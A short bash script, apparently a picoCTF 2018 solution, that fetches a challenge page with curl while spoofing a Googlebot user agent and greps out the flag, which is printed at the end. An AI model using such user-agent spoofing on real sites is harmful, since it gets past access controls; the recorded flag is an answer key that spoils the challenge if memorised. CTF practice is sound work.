#!/bin/bash

curl -s "http://2018shell3.picoctf.com:53383/flag" -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" | grep pico

# We just need to change our user agent to be something like Googlebot's.
# https://developers.whatismybrowser.com/useragents/explore/software_name/googlebot/

# picoCTF{s3cr3t_ag3nt_m4n_134ecd62}
